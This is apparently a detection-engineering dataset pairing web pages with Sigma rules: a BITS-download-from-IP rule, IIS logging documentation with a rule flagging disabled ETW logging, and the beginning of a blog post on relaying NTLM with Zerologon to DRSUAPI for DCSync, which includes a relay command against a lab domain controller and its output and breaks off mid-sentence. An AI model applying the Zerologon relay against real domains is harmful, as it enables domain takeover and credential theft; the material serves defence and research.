      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml",
    "id": "721"
  },
  {
    "url": "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/",
    "markdown": "# Default Log File Settings for Web Sites <logFile>\n\n## Overview\n\nThe `<logFile>` element of the `<siteDefaults>` element contains attributes that allow you to configure default logging for a site on IIS 7 and later.\n\nFor example, you can enable or disable logging, configure the format of the IIS log file, specify the categories of information to store in the log file, and change the directory where the log file is stored. You can also use the `<logFile>` element to control how often IIS creates a new log file based either on log file size or time interval and the maximum size (in bytes) that a log file can become.\n\nBy default, IIS 7 and later uses the World Wide Web Consortium (W3C) log file format. You can change this setting by modifying the **logFormat** attribute to **IIS**, **NCSA**, or **Custom**.\n\n> **Note**\n> ODBC logging is implemented as a custom logging module in IIS 7 and later. As a result, enabling and configuring ODBC logging in IIS 7 and later consists of two separate actions:\n>\n> - Setting the ODBC logging attributes in the <odbcLogging> element. These attributes specify the System Data Source Name (DSN), table name, user name, and password for the ODBC connection.\n> - Setting the correct custom logging attributes in `<logFile>` element. These attributes must set the log file format to \"Custom\" and the custom log plug-in class ID to \"{FF16065B-DE82-11CF-BC0A-00AA006111E0}\".\n\nFor more information about ODBC logging, see the <odbcLogging> element.\n\nYou can define the categories of information that IIS logs by editing the **logExtFileFlags** attribute. The default values are **Date**, **Time**, **ClientIP**, **UserName**, **ServerIP**, **Method**, **UriStem**, **UriQuery**, **TimeTaken**, **HttpStatus**, **Win32Status**, **ServerPort**, **UserAgent**, **HttpSubStatus**, and **Referer**.\n\n> **Note**\n> If the `<logFile>` element is configured in both the `<siteDefaults>` section and in the `<site>` section for a specific site, the configuration in the `<site>` section is used for that site.\n\nIIS 8.5 enables you to log custom fields in addition to the standard logged set. The log file format must be W3C to add custom fields. For more information, see customFields.\n\n## Compatibility\n\n| Version  | Notes                                                                                                                                                                                                                                                                                                                                                                              |\n| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| IIS 10.0 | The `<logFile>` element was not modified in IIS 10.0.                                                                                                                                                                                                                                                                                                                              |\n| IIS 8.5  | Added the **flushByEntrycountW3CLog** attribute to specify the number of events to be stored in the buffer before they are flushed to the log file. Added the **logTargetW3C** attribute to specify how logged IIS events are processed. Added the **maxLogLineLength** attribute to specify the maximum length of a line in a log file. Added the `<customFields>` child element. |\n| IIS 8.0  | The **logSiteId** attribute was added to specify the contents of the -sitename field, and **referer** flag was added to the default value of the **logExtFileFlags** attribute.                                                                                                                                                                                                    |\n| IIS 7.5  | The `<logFile>` element was not modified in IIS 7.5.                                                                                                                                                                                                                                                                                                                               |\n| IIS 7.0  | The `<logFile>` element of the `<siteDefaults>` element was introduced in IIS 7.0.                                                                                                                                                                                                                                                                                                 |\n| IIS 6.0  | The `<logFile>` element replaces sections of the logging properties on the IIS 6.0 **IIsWebService** metabase object.                                                                                                                                                                                                                                                              |\n\n## Setup\n\nThe `<logFile>` element is included in the default installation of IIS 7 and later.\n\n## How To\n\n### How to edit the default logging settings for a server\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 or Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8 or Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows Server 2008 or Windows Server 2008 R2:\n     - On the taskbar, click **Start**, point to **Administrative Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows Vista or Windows 7:\n     - On the taskbar, click **Start**, and then click **Control Panel**.\n     - Double-click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, click the server name on which you want to configure logging.\n\n3. In the **Home** pane, double-click **Logging**.\n\n   ```image\n   Alt: Screenshot that shows the Server Home pane, with Logging selected.\n   Description: The image depicts a section of the Internet Information Services (IIS) Manager interface, specifically highlighting the 'Logging' option among other administrative tools. The 'Logging' icon is visually emphasized, indicating where users can configure logging settings for web servers. Other adjacent icons related to HTTP settings and filters are also visible, providing context to the server management interface.\n   Transcription: |\n     - Handler Mappings\n     - HTTP Redirect\n     - HTTP Response...\n     - ISAPI Filters\n     - Logging\n   ```\n\n4. In the **Logging** pane, select the log file format in the **Format** box, and then type the path to the directory where you store the log files in the **Directory** box or click **Browse...** to choose the directory in which to store the log files.\n\n   ```image\n   Alt: Screenshot that shows the Logging pane. W 3 C is selected for Format.\n   Description: The image shows a screenshot of the Internet Information Services (IIS) Manager's Logging configuration pane. It displays the section where users can configure how IIS logs requests, with a focus on the log file format setting. The 'Format' dropdown menu is set to 'W3C', indicating that this format is selected for logging web requests.\n   Transcription: |\n     Logging  \n     Use this feature to configure how IIS logs requests.\n     \n     Log File  \n     Format:  \n     W3C\n   ```\n\n5. If you choose to use the W3C log file format:\n   - Click **Select Fields** to choose the types of information to log.\n   - In the **W3C Logging Fields** dialog box, select the check boxes for options you want to log, clear the check boxes for options you do not want to log, and then click **OK**.\n\n   ```image\n   Alt: Screenshot that shows the W 3 C Logging Fields dialog box.\n   Description: The image displays a screenshot of the W3C Logging Fields dialog box in Internet Information Services (IIS) Manager. Various logging options are listed with checkboxes, including fields like 'Date', 'Time', 'Client IP Address', 'User Name', 'Service Name', 'Server Name', 'Server IP Address', and 'Server Port'. The checkboxes indicate which fields can be selected for logging, with some fields checked and others unchecked.\n   Transcription: |\n     W3C Logging Fields\n     - [x] Date ( date )\n     - [x] Time ( time )\n     - [x] Client IP Address ( c-ip )\n     - [x] User Name ( cs-username )\n     - [x] Service Name ( s-sitename )\n     - [ ] Server Name ( s-computername )\n     - [x] Server IP Address ( s-ip )\n     - [ ] Server Port ( s-port )\n   ```\n\n### How to configure ETW or file logging for W3C logs\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, expand the server name.\n\n3. In the site's home pane, double-click **Logging**.\n\n4. In the **Logging** home page, for **Log Event Destination**, select **Log file only**, **ETW event only**, or **Both log file and ETW event**.\n\n   ```image\n   Alt: Screenshot that shows the Logging pane. Log file only is selected for Log Event Destination.\n   Description: The image shows a screenshot of the 'Logging' configuration pane in Internet Information Services (IIS) Manager. It displays options for 'Log Event Destination,' highlighting the selection of 'Log file only' as the preferred logging method. The interface features radio buttons for three logging options: 'Log file only,' 'ETW event only,' and 'Both log file and ETW event.' This configuration is relevant for setting up logging for web servers.\n   Transcription: |\n     Log Event Destination  \n     Select the destination where IIS will write logs:  \n     - ● Log file only  \n     - ○ ETW event only  \n     - ○ Both log file and ETW event\n   ```\n\n### How to configure flushing a W3C log by entry count\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, select the server, and then double-click **Configuration Editor**.\n\n3. In the **Configuration Editor**, for the **Section**, expand `system.applicationHost`, and then select **sites**.\n\n4. Expand **siteDefaults**, and then expand **logFile**.\n\n5. For **flushByEntryCountW3Clog**, enter the number of events to be stored in the buffer before they are flushed to the log file.\n\n6. In the **Action** pane, click **Apply**.\n\n   ```image\n   Alt: Screenshot that shows the Collection Editor window. In the Properties pane, flush By Entry Count W 3 C Log is selected.\n   Description: The image depicts a screenshot of the Configuration Editor window in Internet Information Services (IIS) Manager. It shows a section titled 'logFile' with various settings related to logging configuration. The setting 'flushByEntryCountW3Clog' is highlighted, indicating its current value of '0'. This image is relevant for understanding how to configure log file settings in IIS, particularly regarding the flushing of W3C logs.\n   Transcription: |\n     logFile\n        customFields\n        customLogPluginClsid\n        directory                %SystemDrive%\\inetpub\\logs\\LogFiles\n        enabled                  True\n        flushByEntryCountW3CLog  0\n        localTimeRollover        True\n        logExtFileFlags          Data\n   ```\n\n### How to configure the maximum log line length\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, expand the server, and then double-click **Configuration Editor**.\n\n3. In the **Configuration Editor**, for the **Section**, expand `system.applicationHost`, and then select **sites**.\n\n4. Expand **siteDefaults**, and then expand **logFile**.\n\n5. For **maxLogLineLength**, enter the maximum number of bytes in a single line of a log file.\n\n6. In the **Action** pane, click **Apply**.\n\n   ```image\n   Alt: Screenshot that shows the Collection Editor window. In the Properties pane, max Log Line Length is selected.\n   Description: The image displays a screenshot of the Configuration Editor window in Internet Information Services (IIS) Manager. It shows various settings related to log file configuration for web sites, including parameters like 'enabled', 'flushByEntryCountW3CLog', 'localTimeRollover', 'logExtFileFlags', 'logFormat', 'logSiteId', 'logTargetW3C', and 'maxLogLineLength'. The value for 'maxLogLineLength' is set to 65536, indicating the maximum number of bytes allowed in a single line of a log file.\n   Transcription: |\n     enabled                     True\n     flushByEntryCountW3CLog     0\n     localTimeRollover           False\n     logExtFileFlags             Date,Time\n     logFormat                   W3C\n     logSiteId                   True\n     logTargetW3C                File,ET\n     maxLogLineLength            65536\n   ```\n\n## Configuration\n\n### Attributes\n\n| Attribute                 | Description|\n| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `customLogPluginClsid`    | Optional string attribute. Specifies the COM object class ID (CLSID) or IDs, in order of precedence, for custom modules.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| `directory`               | Optional string attribute. Specifies the logging directory, where the log file and logging-related support files are stored. The default value is `%SystemDrive%\\inetpub\\logs\\LogFiles`.                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| `enabled`                 | Optional Boolean attribute. Specifies whether logging is enabled (**true**) or disabled (**false**) for a site. **Note:** ASP and ODBC errors are not logged in the IIS log files. The default value is **true**.                                                                                                                                                                                                                                                                                                                                                                                                   |\n| `flushByEntryCountW3CLog` | Optional uint attribute. Specifies the number of events to be stored in the buffer before they are flushed to the log file. A lower number will cause events to be flushed more quickly, at the cost of performance as a result of a greater number of disk operations. Reduce this value for more real-time troubleshooting, increase it for performance. A value of **0** specifies that the flush will occur at the default maximum of 64k. The default value is **0**.                                                                                                                                          |\n| `localTimeRollover`       | Optional Boolean attribute. Specifies whether a new log file is created based on local time or Coordinated Universal Time (UTC). When false, a new log file is created based on UTC. **Note:** Regardless of the setting, the time stamp for each W3C Extended Logging log record is UTC-based. The default value is **false**.                                                                                                                                                                                                                                                                                     |\n| `logExtFileFlags`         | Optional flags attribute. Specifies the categories of information that are written to either the log file (when you use W3C Extended log file format) or to the ODBC data source during logging events for a site. The **logExtFileFlags** attribute can be one or more of the following values. If you specify more than one value, separate them with a comma (,). The default values are **Date**, **Time**, **ClientIP**, **UserName**, **ServerIP**, **Method**, **UriStem**, **UriQuery**, **TimeTaken**, **HttpStatus**, **Win32Status**, **ServerPort**, **UserAgent**, **HttpSubStatus**, and **Referer**. |\n\n### Child Elements\n\n| Element        | Description                                                                                    |\n| -------------- | ---------------------------------------------------------------------------------------------- |\n| <customFields> | Optional element. Specifies the configuration settings for default custom fields in a W3C log. |\n\n### Configuration Sample\n\nThe following configuration sample specifies default `<logFile>` options.\n\n```\n<system.applicationHost>\n   <sites>\n      <siteDefaults>\n         <logFile logFormat=\"W3C\"\n            directory=\"%SystemDrive%\\inetpub\\logs\\LogFiles\"\n            enabled=\"true\">\n            <customFields>\n               <clear/>\n               <add logFieldName=\"ContosoField\" sourceName=\"ContosoSource\"\n                  sourceType=\"ServerVariable\" />\n            </customFields>\n         </logFile>\n      </siteDefaults>\n   </sites>\n</system.applicationHost>\n```\n\n## Sample Code\n\nThe following code samples configure the default `<logFile>` options for IIS 7.\n\n### AppCmd.exe\n\n```\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.enabled:\"True\" /commit:apphost\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.logFormat:\"W3C\" /commit:apphost\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.directory:\"%SystemDrive%\\inetpub\\logs\\LogFiles\" /commit:apphost\n```\n\n> **Note**\n> You must be sure to set the **commit** parameter to **apphost** when you use AppCmd.exe to configure these settings. This commits the configuration settings to the appropriate location section in the ApplicationHost.config file.\n\n### C#\n\n```\nusing System;\nusing System.Text;\nusing Microsoft.Web.Administration;\n\ninternal static class Sample\n{\n   private static void Main()\n   {\n      using (ServerManager serverManager = new ServerManager())\n      {\n         Configuration config = serverManager.GetApplicationHostConfiguration();\n         ConfigurationSection sitesSection = config.GetSection(\"system.applicationHost/sites\");\n         ConfigurationElement siteDefaultsElement = sitesSection.GetChildElement(\"siteDefaults\");\n\n         ConfigurationElement logFileElement = siteDefaultsElement.GetChildElement(\"logFile\");\n         logFileElement[\"logFormat\"] = @\"W3C\";\n         logFileElement[\"directory\"] = @\"%SystemDrive%\\inetpub\\logs\\LogFiles\";\n         logFileElement[\"enabled\"] = true;\n\n         serverManager.CommitChanges();\n      }\n   }\n}\n```\n\n### VB.NET\n\n```\nImports System\nImports System.Text\nImports Microsoft.Web.Administration\n\nModule Sample\n\n   Sub Main()\n      Dim serverManager As ServerManager = New ServerManager\n      Dim config As Configuration = serverManager.GetApplicationHostConfiguration\n      Dim sitesSection As ConfigurationSection = config.GetSection(\"system.applicationHost/sites\")\n      Dim siteDefaultsElement As ConfigurationElement = sitesSection.GetChildElement(\"siteDefaults\")\n\n      Dim logFileElement As ConfigurationElement = siteDefaultsElement.GetChildElement(\"logFile\")\n      logFileElement(\"logFormat\") = \"W3C\"\n      logFileElement(\"directory\") = \"%SystemDrive%\\inetpub\\logs\\LogFiles\"\n      logFileElement(\"enabled\") = True\n\n      serverManager.CommitChanges()\n   End Sub\n\nEnd Module\n```\n\n### JavaScript\n\n```\nvar adminManager = new ActiveXObject('Microsoft.ApplicationHost.WritableAdminManager');\nadminManager.CommitPath = \"MACHINE/WEBROOT/APPHOST\";\nvar sitesSection = adminManager.GetAdminSection(\"system.applicationHost/sites\", \"MACHINE/WEBROOT/APPHOST\");\nvar siteDefaultsElement = sitesSection.ChildElements.Item(\"siteDefaults\");\n\nvar logFileElement = siteDefaultsElement.ChildElements.Item(\"logFile\");\nlogFileElement.Properties.Item(\"logFormat\").Value = \"W3C\";\nlogFileElement.Properties.Item(\"directory\").Value = \"%SystemDrive%\\\\inetpub\\\\logs\\\\LogFiles\";\nlogFileElement.Properties.Item(\"enabled\").Value = true;\n\nadminManager.CommitChanges();\n```\n\n### VBScript\n\n```\nSet adminManager = WScript.CreateObject(\"Microsoft.ApplicationHost.WritableAdminManager\")\nadminManager.CommitPath = \"MACHINE/WEBROOT/APPHOST\"\nSet sitesSection = adminManager.GetAdminSection(\"system.applicationHost/sites\", \"MACHINE/WEBROOT/APPHOST\")\nSet siteDefaultsElement = sitesSection.ChildElements.Item(\"siteDefaults\")\n\nSet logFileElement = siteDefaultsElement.ChildElements.Item(\"logFile\")\nlogFileElement.Properties.Item(\"logFormat\").Value = \"W3C\"\nlogFileElement.Properties.Item(\"directory\").Value = \"%SystemDrive%\\inetpub\\logs\\LogFiles\"\nlogFileElement.Properties.Item(\"enabled\").Value = True\n\nadminManager.CommitChanges()\n```",
    "sigma_rule": {
      "title": "ETW Logging/Processing Option Disabled On IIS Server",
      "id": "a5b40a90-baf5-4bf7-a6f7-373494881d22",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable/remove the ETW logging/processing option.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/"
      ],
      "author": "frack113, Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|endswith": "@logTargetW3C",
          "OldValue|contains": "ETW"
        },
        "filter_main_etw_added": {
          "NewValue|contains": "ETW"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_etw_disabled.yml",
    "id": "735"
  },
  {
    "url": "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
    "markdown": "# A different way of abusing Zerologon (CVE-2020-1472)\n\nIn August 2020, Microsoft patched CVE-2020-1472 aka Zerologon. This is in my opinion one of the most critical Active Directory vulnerabilities of the past few years, since it allows for instant escalation to Domain Admin without credentials. The most straightforward way to exploit this involves changing the password of a Domain Controller computer account. This is a risky move and could potentially break things in the environment. In this blog we explore a new way to exploit this vulnerability, which though it has a few more prerequisites, is safer to use for security professionals assessing network security. We’ll also dive a bit more into the authentication protocols in Active Directory and how they can be tied in with the Zerologon vulnerability. While this is a different way of exploiting the vulnerability, it does not bypass the mitigations released, so if you have already installed the August 2020 patches, you are also protected from this attack.\n\n## Zerologon\n\nLet’s start with the vulnerability. In case you haven’t read the details yet, you can read about it on the Secura blog, on which Tom Tervoort, the researcher who discovered the vulnerability, describes the technical details. The vulnerability exists of a cryptographic flaw, where for 1 in every 256 randomly generated keys, the encryption of a plain text consisting of all null bytes will result in a ciphertext of also all null bytes. This vulnerable cryptographic protocol implementation is used as authentication mechanism in the Netlogon protocol. The netlogon protocol is used in Active Directory mostly by workstations and servers to communicate with Domain Controllers over a secure channel. This works because every workstation or server that is joined to Active Directory has a computer account for which it knows the password. Active Directory possesses several keys that are derived from this same password, which can be used in authentication protocols such as Kerberos and NTLM.\n\nThe original Zerologon attack works by resetting the password of the Active Directory account of a Domain Controller in the domain to an empty string. This allows an attacker to authenticate as that Domain Controller to another Domain Controller, or even the same Domain Controller. Being able to authenticate as a Domain Controller is a high privilege, because Domain Controllers can use the DRSUAPI protocol to synchronize Active Directory data, including NT hashes and Kerberos keys. These keys in turn can be used to impersonate any user in the domain, or to create fake Kerberos tickets. The exploitation of this is not without risks. The moment the Domain Controller machine account password is reset in Active Directory, the DC is in an inconsistent state. The encrypted machine account password, that is stored in the registry and in the memory of `lsass.exe`, is not changed. The password of the same account in Active Directory is now changed, which has consequences for authentication both from and to this Domain Controller. If the Domain Controller is rebooted, various services will not start any more because they want to read information from Active Directory. I wrote a thread last week about how any why things break if you reset this machine account, which you can read here. If you perform the exploitation fast enough you can recover the original password from the registry and restore that using a restore script that I added to the GitHub repository containing an example exploit. This still leaves a risk of things breaking in the meanwhile, which is why I wouldn’t really recommend exploiting this in a production environment.\n\n## Finding an alternative way to exploit Zerologon\n\nSince the original attack carries quite some risk, I wanted to figure out a way to exploit Zerologon without having to reset a computer account. For this we have to take a look both at authentication protocols and at some previous flaws in Netlogon. In Active Directory, there are two primary authentication protocols: NTLM and Kerberos. Kerberos is partially decentralized and works based on cryptography and shared secrets. NTLM however is fully centralized and requires communication with the Domain Controller to work if Domain accounts are used. This is because NTLM uses a challenge-response authentication mechanism, in which a cryptographic operation is performed on a challenge sent by the server to prove that the user possesses their password (or a hashed version of their password to be exact). For Active Directory accounts, the server does not actually know what the password is of the user trying to authenticate, so it forwards this to the Domain Controller, which tells the server whether the response is correct for the given challenge. This forwarding is actually done over the Netlogon protocol, in which the Zerologon vulnerability exists.\n\nOne of the weaknesses of the NTLM protocol is that if an attacker can convince a user to authenticate to them using NTLM, they can forward the authentication messages to a different server and impersonate the user on this server. This is known as NTLM relaying and has been around for a very long time. Several security measures have been introduced over the years to reduce the effectiveness of NTLM relaying, but every now and then some vulnerability tends to pop up which once again allows attackers to abuse it and take over systems.\n\nOne attack avenue of NTLM that has quite some potential and is considered as by-design, is the “Printer Bug” feature that was discovered in 2018 by Will and Lee. This is an interesting feature because it allows an attacker to trigger the authentication via NTLM of any machine that has the spoolservice enabled. This authentication can also be forced to take place using NTLM by making the machine account authenticate to the attackers IP address instead of the hostname, which makes it use NTLM instead of Kerberos. Relaying this authentication to a useful destination is however not possible by default because the authentication happens over the SMB protocol, which requires the use of cryptographic signatures whenever we use it to talk to Domain Controllers. I’ve discussed the details of this extensively in a previous blog.\n\nTo understand the new attack avenue that is described in this blog, we need to take a look of how signing and encryption of data works when authentication is performed using the NTLM protocol. The encryption key to sign and encrypt messages is called the session key, and it is based on the NT hash of a user and some of the properties negotiated in the protocol. That means that in order to calculate the session key, the server needs to posses the NT hash of the user. Unless the server is a Domain Controller, it doesn’t posses that NT hash. Thus it sends the authentication message to the Domain Controller using the Netlogon RPC protocol, which returns this session key to the server. This is shown in the diagram below:\n\n```image\nAlt: Netlogon flow\nDescription: The image depicts a flowchart illustrating the authentication process involving NTLM and Netlogon. It shows three main components: the Domain Controller (DC), the Server, and the Client. The flow indicates the steps involved in NTLM authentication (step 2), the retrieval of the session key (step 3) via the Netlogon protocol, and the initial authentication request from the Client to the Server (step 1). The connections between these components are color-coded, with a blue line representing the Netlogon protocol and a red line indicating the session key retrieval.\nTranscription: |\n  1. Auth\n  2. NTLM Auth\n  3. session key\n  \n  Client --> Auth --> Server\n  Server --> NTLM Auth --> DC\n  DC --> netlogon --> Server\n  \n  Labels:\n  - DC\n  - Server\n  - Client\n```\n\nNow the interesting thing here is that Zerologon gives us an authentication bypass for the netlogon protocol. When combining this with relaying, I immediately thought about CVE-2015-0005 which was found by Alberto Solino a few years back. This CVE allowed any machine account to request the session key, thereby making it possible to relay authentication to endpoints which require signing and/or encryption. If we could achieve the same using Zerologon, any protocol accepting NTLM authentication and allowing for privileged access would be a potential target.\n\n## Relaying to DRSUAPI for instant DCSync\n\nWhat would be an interesting protocol to target? Using the printer bug we can get any machine account to authenticate to our attacker controlled SMB server. Machine accounts do not have high privileges often, though it can happen that they are granted Administrator rights. The highest privileged accounts are Domain Controllers, which can use the DRSUAPI to synchronize the Active Directory database. This is also abused in the initial Zerologon POC, where the machine account password is reset and rights to DCSync are obtained. What would be more interesting though from a technical perspective is if we could avoid changing the password and use the relayed connection to directly authenticate to the RPC endpoint of the DRSUAPI protocol. While this protocol requires signing and encryption, maybe we could obtain the session key using Zerologon, and comply with all the cryptographic requirements to talk to this protocol.\n\n### Diving into Netlogon and NTLM\n\nThe code Alberto used to exploit the CVE-2015-0005 vulnerability is still present in impacket, so I decided to start with that and see if I could get SMB relaying working to a Domain Controller, which requires signing. Instead of using a machine account to authenticate, we use the code from the Zerologon POC to bypass authentication entirely and pretend to be the same machine we are relaying to. This requires some editing in the code to make sure it uses RPC over TCP instead of over a named pipe, but combining it with code from the CVE-2020-1472 POC this is relatively straightforward. Trying it out with a manual connection that I’m setting up from a Windows box, we see it relays successfully to the DC where signing is required.\n\n```image\nAlt: smb relay with signing and auth bypass\nDescription: The image is a terminal output showing the execution of a Python script (`smbrelay.py`) from the Impacket library related to the exploitation of the Zerologon vulnerability (CVE-2020-1472). It displays various debug messages indicating the setup of an SMB relay server, including incoming connections and authentication status. Key details include the successful validation of a user account (`TESTSEGMENT\\backupadmin`) through the NETLOGON service and the required signature for the connection. The output suggests that the attack successfully bypassed authentication to connect to a Domain Controller.\nTranscription: |\n  (CVE-2020-1472) user@localhost:~/imp-tmp$ smbrelayx.py -debug -h s2016dc.testsegment.local -machine-account testsegment/s2016dc -domain 192.168.222.113\n  Impacket v0.9.22.dev1+20200914.131346.64ce465 - Copyright 2020 SecureAuth Corporation\n  \n  [+] Impacket Library Installation Path: /home/dirkjan/imp-tmp/impacket\n  [*] Running in relay mode\n  [*] Config file parsed\n  [*] Setting up SMB Server\n  [*] Setting up HTTP Server\n  \n  [*] Servers started, waiting for connections\n  [*] Incoming connection (192.168.222.55,50222)\n  [*] SMBD: Received connection from 192.168.222.55, attacking target s2016dc.testsegment.local\n  [*] Signature is REQUIRED on the other end, using NETLOGON approach\n  [*] Connecting to 192.168.222.113 NETLOGON service\n  S2016DC\n  s2016dc\n  Auth OK!\n  [*] TESTSEGMENT\\backupadmin successfully validated through NETLOGON\n  [*] SMB Signing key: b'8df0b12a64136d95c44e09564cb7a7c9'\n  [*] Authenticating against s2016dc.testsegment.local as TESTSEGMENT\\backupadmin SUCCEED\n```\n\nThe netlogon operation in play here is the `NetrLogonSamLogonWithFlags` function. When discussing this attack with Benjamin Delpy, we were initially quite surprised that this works. According to the documentation, when this function is called, the NTLM session key should be encrypted with the netlogon session key, which we don’t possess as we are bypassing the authentication. Some further digging brings us to this page, which explains it. Since the `ValidationLevel` that we specified is `NetlogonValidationSamInfo4`, the value of this parameter is 6, which according to the table means that nothing is encrypted! I don’t know exactly what the logic behind this is, but as a result of this it is possible to call the `NetrLogonSamLogonWithFlags` function as any account with Zerologon, and get the plain text sessionkey for the NTLM authentication from it.\n\n### Relaying to DRSUAPI\n\nIn theory we should be able to use the same logic as in the SMB relay to relay to DRSUAPI, except of course that relaying RPC is a whole different protocol. Lucky for us, an RPC relay client was recently added to ntlmrelayx by Arseniy Sharoglazov. We can use that code as a base to develop the DCSync client. Since using the DRSUAPI protocol requires signing and encryption, we have to make sure that when the connection is initialized we negotiate `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` instead. After we relay all 3 NTLM messages, we should be able to get the signing key over Netlogon and we should be able to send any operation over the connection.\n\nOf course things are never as easy as they would seem. After I finished writing the code that would allow for this, mostly by copying existing code for interacting with DRSUAPI from impackets secretsdump, I expected things to work, but was greeted by error messages instead:\n\n```image\nAlt: Security package error\nDescription: The image is a screenshot of a command-line interface (CLI) output, showing logs related to a Netlogon authentication process. It includes messages indicating that a connection is being established with a target domain controller (DC) and that authentication is successfully bypassed using Zerologon. Additionally, there are traceback errors at the bottom, indicating issues during the authentication process, specifically related to unknown DCE RPC fault status codes. This image provides technical information relevant to the exploitation of the Zerologon vulnerability.\nTranscription: |\n  [*] Servers started, waiting for connections\n  [*] SMBD-Thread-3: Connection from TESTSEGMENT/BACKUPADMIN@192.168.222.55 controlled, attacking target dcsync://s2016dc.testsegment.local\n  [*] Connecting to s2016dc.testsegment.local NETLOGON service\n  [*] Netlogon Auth OK, successfully bypassed authentication using Zerologon!\n  [*] TESTSEGMENT\\backupadmin successfully validated through NETLOGON\n  [*] NTLM Sign/seal key: ae441ddc2decff7a3c7ea6e7a99bb5be\n  Traceback (most recent call last):\n    File \"/home/dirkjan/imp-tmp/impacket/examples/ntlmrelayx/clients/dcsyncclient.py\", line 218, in sendAuth\n      resp = self.session.request(request)\n    File \"/home/dirkjan/imp-tmp/impacket/dcerpc/v5/rpcrt.py\", line 857, in request\n      answer = self.recv()\n    File \"/home/dirkjan/imp-tmp/impacket/dcerpc/v5/rpcrt.py\", line 1330, in recv\n      raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)\n  impacket.dcerpc.v5.rpcrt.DCERPCException: Unknown DCE RPC fault status code: 00000721\n```\n\nI spent some time comparing the packets that were sent by secretsdump and that were sent when relaying, and found an important difference. In the NTLM negotiate messages, secretsdump would put both the flags for encryption (sealing) as for signing, since 